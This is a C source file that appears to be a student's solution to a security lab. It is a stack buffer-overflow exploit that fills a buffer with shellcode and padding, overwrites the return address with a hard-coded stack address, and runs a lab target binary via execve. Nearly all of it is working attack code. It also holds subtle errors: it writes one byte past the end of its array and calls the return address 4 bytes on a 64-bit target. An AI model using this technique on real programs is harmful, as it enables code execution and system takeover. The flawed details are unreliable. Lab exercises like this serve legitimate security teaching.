#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"



// just some of my notes 
// target of lab_main rip 0x3021fec8
// the buf is located at 0x3021fe50
// 96 = 0x60 => 0x3021feb0

// foo returns at 0x400c07

// the size of from beginning of buffer to the rip main is 120 bytes + 4 bytes to the RA

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];
	
	// the size of RA is 4 bytes
	int buffer_size = 120 + 4;
	int shell_length = strlen(shellcode);

	char atk_buf[buffer_size];
	
	// fill the beginning of the buffer with shellcode characters
	for(int i = 0; i < shell_length; i++){
		atk_buf[i] = shellcode[i];
	}
	
	// fill the remaining with A (until RA)
	for(int i = shell_length; i < buffer_size; i++){
		atk_buf[i] = 'A';
	}

	// execve null constrain in atk_buf
	atk_buf[124] = '\0';

	// Overwrite the RA with the addr of the start of buffer which is 0x3021fe50
	atk_buf[120] = '\x50';
	atk_buf[121] = '\xfe';
	atk_buf[122] = '\x21';
	atk_buf[123] = '\x30';

	
	args[0] = TARGET;
	args[1] = atk_buf;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
